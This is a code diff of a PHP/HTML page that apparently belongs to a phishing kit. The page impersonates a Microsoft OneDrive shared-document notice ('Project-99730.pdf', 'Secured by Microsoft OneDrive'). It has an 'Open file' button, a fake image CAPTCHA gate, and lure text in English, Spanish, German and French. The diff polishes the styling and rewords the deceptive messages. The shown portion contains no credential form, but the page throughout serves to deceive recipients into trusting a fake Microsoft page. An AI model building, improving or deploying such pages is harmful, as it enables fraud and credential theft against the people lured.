@@ -2,207 +2,239 @@
 $today = (new DateTime('now', new DateTimeZone('Europe/Berlin')))->format('F j, Y');
 ?>
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en-GB">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Shared Document</title>
+    <title>Project-99730.pdf</title>
     <link rel="icon" href="img.php?k=icon" type="image/svg+xml">
     <style>
         :root {
-            --brand-primary: #0078d4;
-            --brand-hover: #106ebe;
+            --blue: #0078d4;
+            --blue-dark: #005a9e;
+            --blue-soft: #eff6fc;
+            --text: #242424;
+            --muted: #707070;
+            --line: #e0e0e0;
             --white: #ffffff;
-            --text-main: #1b1b1b;
-            --text-sub: #616161;
         }
 
         * { box-sizing: border-box; margin: 0; padding: 0; }
 
         body {
-            font-family: "Segoe UI", -apple-system, system-ui, BlinkMacSystemFont, Roboto, "Helvetica Neue", Arial, sans-serif;
-            background-color: #f3f9fd;
-            background-image:
-                radial-gradient(circle at 12% 18%, rgba(0, 120, 212, 0.18) 0%, transparent 55%),
-                radial-gradient(circle at 88% 82%, rgba(0, 164, 239, 0.16) 0%, transparent 55%);
-            background-attachment: fixed;
+            font-family: "Segoe UI", "Segoe UI Web", -apple-system, BlinkMacSystemFont, sans-serif;
+            background: linear-gradient(180deg, #f5f8fc 0%, #eef3f8 100%);
             min-height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
-            padding: 20px;
+            padding: 24px;
+            color: var(--text);
+            -webkit-font-smoothing: antialiased;
         }
 
         .auth-card {
             background: var(--white);
-            width: 420px;
+            width: 400px;
             max-width: 100%;
-            border-radius: 8px;
-            padding: 40px 44px;
-            box-shadow: 0 6px 30px rgba(0,0,0,0.1), 0 1px 4px rgba(0,0,0,0.06);
-            text-align: center;
-            border: 1px solid rgba(0,0,0,0.05);
-            border-top: 4px solid var(--brand-primary);
-            animation: cardIn 0.5s cubic-bezier(0.16,1,0.3,1) forwards;
+            border-radius: 6px;
+            padding: 36px 32px 28px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.06), 0 12px 32px rgba(0,0,0,0.08);
+            border: 1px solid var(--line);
+            animation: cardIn 0.45s ease forwards;
             opacity: 0;
         }
 
         @keyframes cardIn {
-            0% { opacity: 0; transform: translateY(18px); }
-            100% { opacity: 1; transform: translateY(0); }
+            from { opacity: 0; transform: translateY(12px); }
+            to { opacity: 1; transform: translateY(0); }
         }
 
-        .brand-logo { width: 64px; height: 64px; object-fit: contain; margin-bottom: 8px; }
-        .od-wordmark { font-size: 18px; font-weight: 600; color: #1b1b1b; margin-bottom: 20px; }
-        .od-wordmark span { color: var(--brand-primary); }
+        .brand-block {
+            text-align: center;
+            margin-bottom: 28px;
+        }
+
+        .brand-logo {
+            width: 108px;
+            height: auto;
+            display: block;
+            margin: 0 auto 10px;
+        }
+
+        .od-wordmark {
+            font-size: 17px;
+            font-weight: 600;
+            color: var(--blue);
+            letter-spacing: -0.02em;
+        }
 
         .file-info {
-            background: #f0f7fc;
-            border: 1px solid #cce4f7;
-            border-radius: 8px;
-            padding: 14px 18px;
-            margin-bottom: 20px;
+            background: var(--blue-soft);
+            border: 1px solid #d6e9f8;
+            border-radius: 6px;
+            padding: 16px;
+            margin-bottom: 22px;
             display: flex;
-            align-items: center;
-            gap: 12px;
-            transition: border-color 0.25s, box-shadow 0.25s;
+            align-items: flex-start;
+            gap: 14px;
         }
 
-        .file-info:hover { border-color: var(--brand-primary); box-shadow: 0 0 0 1px var(--brand-primary); }
-        .file-icon { width: 36px; height: 36px; flex-shrink: 0; }
-        .file-details { text-align: left; }
-        .file-name { font-size: 13.5px; font-weight: 600; color: var(--text-main); }
-        .file-meta { font-size: 12px; color: var(--text-sub); margin-top: 2px; }
-        .subtext { font-size: 14px; color: var(--text-sub); margin-bottom: 24px; line-height: 1.5; }
+        .file-icon {
+            width: 40px;
+            height: 40px;
+            flex-shrink: 0;
+            margin-top: 2px;
+        }
+
+        .file-details { flex: 1; min-width: 0; text-align: left; }
+
+        .file-name {
+            font-size: 14px;
+            font-weight: 600;
+            color: var(--text);
+            line-height: 1.35;
+            word-break: break-word;
+        }
+
+        .file-meta {
+            font-size: 12px;
+            color: var(--muted);
+            margin-top: 5px;
+        }
+
+        .subtext {
+            font-size: 13.5px;
+            color: var(--muted);
+            line-height: 1.55;
+            margin-bottom: 22px;
+            text-align: left;
+        }
 
         .cta-button {
-            display: inline-block;
-            background-color: var(--brand-primary);
-            color: white !important;
-            text-decoration: none;
-            padding: 12px 32px;
-            font-size: 15px;
-            font-weight: 600;
-            border-radius: 4px;
-            border: none;
+            display: block;
             width: 100%;
+            background: var(--blue);
+            color: #fff;
+            padding: 11px 20px;
+            font-size: 14px;
+            font-weight: 600;
+            font-family: inherit;
+            border: none;
+            border-radius: 4px;
             cursor: pointer;
-            transition: background-color 0.2s, box-shadow 0.2s, transform 0.12s;
-            box-shadow: 0 2px 6px rgba(0,120,212,0.15);
+            transition: background 0.15s;
         }
 
-        .cta-button:hover { background-color: var(--brand-hover); box-shadow: 0 4px 14px rgba(0,120,212,0.28); transform: translateY(-1px); }
-        .cta-button:active { transform: translateY(0) scale(0.99); }
+        .cta-button:hover { background: var(--blue-dark); }
 
         .footer-note {
-            margin-top: 20px;
-            font-size: 12px;
-            color: var(--text-sub);
-            border-top: 1px solid #f0f0f0;
-            padding-top: 16px;
+            margin-top: 18px;
+            font-size: 11.5px;
+            color: #8a8a8a;
+            text-align: center;
+            line-height: 1.45;
         }
 
         .captcha-overlay {
             position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.45);
+            inset: 0;
+            background: rgba(36, 36, 36, 0.4);
             display: flex;
             align-items: center;
             justify-content: center;
             z-index: 10000;
             opacity: 0;
             visibility: hidden;
-            transition: opacity 0.25s, visibility 0.25s;
-            padding: 16px;
+            transition: opacity 0.2s, visibility 0.2s;
+            padding: 20px;
         }
 
         .captcha-overlay.active { opacity: 1; visibility: visible; }
 
         .captcha-card {
-            background: white;
-            width: 360px;
+            background: var(--white);
+            width: 392px;
             max-width: 100%;
-            border-radius: 4px;
-            box-shadow: 0 12px 40px rgba(0,0,0,0.2);
+            border-radius: 6px;
+            box-shadow: 0 8px 28px rgba(0,0,0,0.18);
+            border: 1px solid var(--line);
             overflow: hidden;
-            transform: translateY(20px) scale(0.97);
-            transition: transform 0.3s cubic-bezier(0.16,1,0.3,1), opacity 0.3s;
-            opacity: 0;
+            transform: translateY(14px);
+            transition: transform 0.25s ease;
         }
 
-        .captcha-overlay.active .captcha-card { transform: translateY(0) scale(1); opacity: 1; }
+        .captcha-overlay.active .captcha-card { transform: translateY(0); }
 
         .captcha-header {
-            background: #1a73e8;
+            background: var(--blue);
             color: #fff;
-            padding: 14px 16px 12px;
-            text-align: left;
+            padding: 16px 18px 14px;
         }
 
         .captcha-header h2 {
-            font-size: 15px;
-            font-weight: 500;
+            font-size: 14px;
+            font-weight: 600;
             line-height: 1.4;
         }
 
         .captcha-header p {
             font-size: 12px;
-            opacity: 0.9;
+            opacity: 0.92;
             margin-top: 4px;
+            font-weight: 400;
         }
 
-        .captcha-body { padding: 16px; position: relative; }
+        .captcha-body { padding: 18px; position: relative; }
 
         .image-grid {
             display: grid;
             grid-template-columns: repeat(3, 1fr);
-            gap: 8px;
+            gap: 7px;
             margin-bottom: 16px;
         }
 
         .tile {
             position: relative;
             aspect-ratio: 1;
-            border: 2px solid #dadce0;
-            border-radius: 2px;
-            background: #f8f9fa;
+            border: 2px solid #d1d1d1;
+            border-radius: 3px;
+            background: #fafafa;
             cursor: pointer;
             overflow: hidden;
-            transition: border-color 0.15s, box-shadow 0.15s;
+            padding: 0;
+            transition: border-color 0.12s;
         }
 
-        .tile:hover { border-color: #4285f4; }
+        .tile:hover { border-color: var(--blue); }
 
         .tile.selected {
-            border-color: #1a73e8;
-            box-shadow: inset 0 0 0 1px #1a73e8;
+            border-color: var(--blue);
+            background: var(--blue-soft);
         }
 
         .tile img {
             width: 100%;
             height: 100%;
             object-fit: contain;
-            padding: 12px;
+            padding: 10px;
             pointer-events: none;
         }
 
         .tile-check {
             position: absolute;
-            top: 6px;
-            right: 6px;
-            width: 22px;
-            height: 22px;
+            top: 5px;
+            right: 5px;
+            width: 20px;
+            height: 20px;
             border-radius: 2px;
-            background: #1a73e8;
+            background: var(--blue);
             display: flex;
             align-items: center;
             justify-content: center;
             opacity: 0;
-            transform: scale(0.8);
-            transition: opacity 0.15s, transform 0.15s;
+            transform: scale(0.85);
+            transition: opacity 0.12s, transform 0.12s;
         }
 
         .tile.selected .tile-check {
@@ -210,46 +242,47 @@ $today = (new DateTime('now', new DateTimeZone('Europe/Berlin')))->format('F j, 
             transform: scale(1);
         }
 
-        .tile-check svg { width: 14px; height: 14px; fill: #fff; }
+        .tile-check svg { width: 13px; height: 13px; fill: #fff; }
 
         .captcha-actions {
             display: flex;
             justify-content: space-between;
             align-items: center;
-            gap: 12px;
+            gap: 10px;
         }
 
         .captcha-actions button {
             font-family: inherit;
-            font-size: 14px;
-            font-weight: 500;
+            font-size: 13px;
+            font-weight: 600;
             border-radius: 4px;
             cursor: pointer;
-            padding: 9px 16px;
+            padding: 8px 14px;
             border: none;
         }
 
         .btn-refresh {
             background: #fff;
-            color: #5f6368;
-            border: 1px solid #dadce0 !important;
+            color: var(--muted);
+            border: 1px solid #d1d1d1 !important;
+            font-weight: 500;
         }
 
-        .btn-refresh:hover { background: #f8f9fa; }
+        .btn-refresh:hover { background: #f5f5f5; }
 
         .btn-verify {
-            background: #1a73e8;
+            background: var(--blue);
             color: #fff;
-            min-width: 96px;
+            min-width: 88px;
         }
 
-        .btn-verify:hover { background: #1558b0; }
-        .btn-verify:disabled { opacity: 0.55; cursor: default; }
+        .btn-verify:hover { background: var(--blue-dark); }
+        .btn-verify:disabled { opacity: 0.5; cursor: default; }
 
         .captcha-loading {
             position: absolute;
             inset: 0;
-            background: rgba(255,255,255,0.9);
+            background: rgba(255,255,255,0.92);
             display: flex;
             flex-direction: column;
             align-items: center;
@@ -260,24 +293,24 @@ $today = (new DateTime('now', new DateTimeZone('Europe/Berlin')))->format('F j, 
         .captcha-loading.hidden { display: none; }
 
         .captcha-spinner {
-            width: 28px;
-            height: 28px;
-            border: 3px solid #e8e8e8;
-            border-top-color: #1a73e8;
+            width: 26px;
+            height: 26px;
+            border: 2px solid #e5e5e5;
+            border-top-color: var(--blue);
             border-radius: 50%;
-            animation: spin 0.7s linear infinite;
+            animation: spin 0.65s linear infinite;
             margin-bottom: 8px;
         }
 
-        .captcha-loading p { font-size: 12px; color: #5f6368; }
+        .captcha-loading p { font-size: 12px; color: var(--muted); }
 
         @keyframes spin { to { transform: rotate(360deg); } }
 
         .error-banner {
-            background: #fce8e6;
-            color: #c5221f;
+            background: #fde7e9;
+            color: #a4262c;
             font-size: 12px;
-            padding: 8px 12px;
+            padding: 8px 10px;
             border-radius: 4px;
             margin-bottom: 12px;
             display: none;
@@ -289,43 +322,47 @@ $today = (new DateTime('now', new DateTimeZone('Europe/Berlin')))->format('F j, 
             display: flex;
             justify-content: flex-end;
             align-items: center;
-            gap: 6px;
-            padding: 10px 16px 12px;
-            border-top: 1px solid #f1f3f4;
+            gap: 5px;
+            padding: 10px 18px 12px;
+            border-top: 1px solid #f0f0f0;
             font-size: 10px;
-            color: #9aa0a6;
+            color: #9a9a9a;
         }
 
-        .captcha-footer svg { width: 16px; height: 16px; fill: #9aa0a6; }
+        .captcha-footer svg { width: 14px; height: 14px; fill: #9a9a9a; }
     </style>
 </head>
 <body>
 
     <div class="auth-card">
-        <img class="brand-logo" src="img.php?k=logo" alt="OneDrive">
-        <div class="od-wordmark">One<span>Drive</span></div>
+        <div class="brand-block">
+            <img class="brand-logo" src="img.php?k=logo" alt="OneDrive">
+            <div class="od-wordmark">OneDrive</div>
+        </div>
+
         <div class="file-info">
-            <svg class="file-icon" viewBox="0 0 36 36" xmlns="http://www.w3.org/2000/svg">
-                <rect x="4" y="2" width="28" height="32" rx="3" fill="#f0f7fc" stroke="#0078d4" stroke-width="1.5"/>
-                <line x1="10" y1="12" x2="26" y2="12" stroke="#0078d4" stroke-width="1.5" opacity="0.4"/>
-                <line x1="10" y1="18" x2="26" y2="18" stroke="#0078d4" stroke-width="1.5" opacity="0.4"/>
-                <line x1="10" y1="24" x2="20" y2="24" stroke="#0078d4" stroke-width="1.5" opacity="0.4"/>
+            <svg class="file-icon" viewBox="0 0 36 36" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+                <rect x="4" y="2" width="28" height="32" rx="3" fill="#eff6fc" stroke="#0078d4" stroke-width="1.5"/>
+                <line x1="10" y1="12" x2="26" y2="12" stroke="#0078d4" stroke-width="1.5" opacity="0.35"/>
+                <line x1="10" y1="18" x2="26" y2="18" stroke="#0078d4" stroke-width="1.5" opacity="0.35"/>
+                <line x1="10" y1="24" x2="20" y2="24" stroke="#0078d4" stroke-width="1.5" opacity="0.35"/>
             </svg>
             <div class="file-details">
-                <div class="file-name">U.S Surveyor-Project-87091.pdf</div>
-                <div class="file-meta">248 KB &bull; <span id="currentDate"><?= htmlspecialchars($today, ENT_QUOTES, 'UTF-8') ?></span></div>
+                <div class="file-name">Project-99730.pdf</div>
+                <div class="file-meta">312 KB &bull; Shared <?= htmlspecialchars($today, ENT_QUOTES, 'UTF-8') ?></div>
             </div>
         </div>
-        <p class="subtext" id="subtext">A document has been shared with you via OneDrive. Only authorized recipients can access this file.</p>
-        <button class="cta-button" id="accessBtn">Access Document</button>
-        <div class="footer-note" id="footerNote">This file is protected by OneDrive security.</div>
+
+        <p class="subtext" id="subtext">This file was shared with you through OneDrive. Only authorised recipients may open it.</p>
+        <button class="cta-button" id="accessBtn">Open file</button>
+        <div class="footer-note" id="footerNote">Secured by Microsoft OneDrive</div>
     </div>
 
     <div class="captcha-overlay" id="captchaOverlay">
         <div class="captcha-card">
             <div class="captcha-header">
                 <h2 id="captchaTitle">Select all images with cars</h2>
-                <p id="captchaSubtitle">Click verify once you're done.</p>
+                <p id="captchaSubtitle">Tap each matching image, then press Verify.</p>
             </div>
             <div class="captcha-body">
                 <div class="captcha-loading" id="captchaLoading">
@@ -335,12 +372,12 @@ $today = (new DateTime('now', new DateTimeZone('Europe/Berlin')))->format('F j, 
                 <div class="error-banner" id="errorBanner"></div>
                 <div class="image-grid" id="imageGrid"></div>
                 <div class="captcha-actions">
-                    <button type="button" class="btn-refresh" id="refreshBtn">New images</button>
+                    <button type="button" class="btn-refresh" id="refreshBtn">New challenge</button>
                     <button type="button" class="btn-verify" id="verifyBtn" disabled>Verify</button>
                 </div>
             </div>
             <div class="captcha-footer">
-                <span>Protected verification</span>
+                <span>Verification required</span>
                 <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
                     <path d="M12 1 3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/>
                 </svg>
@@ -350,21 +387,21 @@ $today = (new DateTime('now', new DateTimeZone('Europe/Berlin')))->format('F j, 
 
     <script>
     (function () {
-        const overlay     = document.getElementById('captchaOverlay');
-        const grid        = document.getElementById('imageGrid');
-        const loadingEl   = document.getElementById('captchaLoading');
-        const errorBanner = document.getElementById('errorBanner');
-        const verifyBtn   = document.getElementById('verifyBtn');
-        const refreshBtn  = document.getElementById('refreshBtn');
+        const overlay      = document.getElementById('captchaOverlay');
+        const grid         = document.getElementById('imageGrid');
+        const loadingEl    = document.getElementById('captchaLoading');
+        const errorBanner  = document.getElementById('errorBanner');
+        const verifyBtn    = document.getElementById('verifyBtn');
+        const refreshBtn   = document.getElementById('refreshBtn');
         const captchaTitle = document.getElementById('captchaTitle');
 
         let challengeToken = '';
         let selected = new Set();
 
         const translations = {
-            es: { subtext: 'Se ha compartido un documento contigo a través de OneDrive. Solo los destinatarios autorizados pueden acceder a este archivo.', accessBtn: 'Acceder al documento', footerNote: 'Este archivo está protegido por la seguridad de OneDrive.', captchaSubtitle: 'Haz clic en verificar cuando termines.' },
-            de: { subtext: 'Eine Datei wurde über OneDrive für Sie freigegeben. Nur autorisierte Empfänger können auf diese Datei zugreifen.', accessBtn: 'Dokument öffnen', footerNote: 'Diese Datei ist durch OneDrive-Sicherheit geschützt.', captchaSubtitle: 'Klicken Sie auf Überprüfen, wenn Sie fertig sind.' },
-            fr: { subtext: 'Un document a été partagé avec vous via OneDrive. Seuls les destinataires autorisés peuvent y accéder.', accessBtn: 'Accéder au document', footerNote: 'Ce fichier est protégé par la sécurité OneDrive.', captchaSubtitle: 'Cliquez sur Vérifier une fois terminé.' }
+            es: { subtext: 'Este archivo se compartió contigo a través de OneDrive. Solo los destinatarios autorizados pueden abrirlo.', accessBtn: 'Abrir archivo', footerNote: 'Protegido por Microsoft OneDrive', captchaSubtitle: 'Selecciona cada imagen coincidente y pulsa Verificar.' },
+            de: { subtext: 'Diese Datei wurde über OneDrive für Sie freigegeben. Nur autorisierte Empfänger können sie öffnen.', accessBtn: 'Datei öffnen', footerNote: 'Geschützt durch Microsoft OneDrive', captchaSubtitle: 'Wählen Sie alle passenden Bilder aus und klicken Sie auf Überprüfen.' },
+            fr: { subtext: 'Ce fichier a été partagé avec vous via OneDrive. Seuls les destinataires autorisés peuvent l\'ouvrir.', accessBtn: 'Ouvrir le fichier', footerNote: 'Sécurisé par Microsoft OneDrive', captchaSubtitle: 'Sélectionnez chaque image correspondante, puis vérifiez.' }
         };
 
         const lang = (navigator.language || navigator.userLanguage || '').substring(0, 2).toLowerCase();
@@ -373,9 +410,6 @@ $today = (new DateTime('now', new DateTimeZone('Europe/Berlin')))->format('F j, 
             document.getElementById('accessBtn').textContent = translations[lang].accessBtn;
             document.getElementById('footerNote').textContent = translations[lang].footerNote;
             document.getElementById('captchaSubtitle').textContent = translations[lang].captchaSubtitle;
-            try {
-                document.getElementById('currentDate').textContent = new Date().toLocaleDateString(navigator.language, { year: 'numeric', month: 'long', day: 'numeric', timeZone: 'Europe/Berlin' });
-            } catch (e) {}
         }
 
         function hideError() {
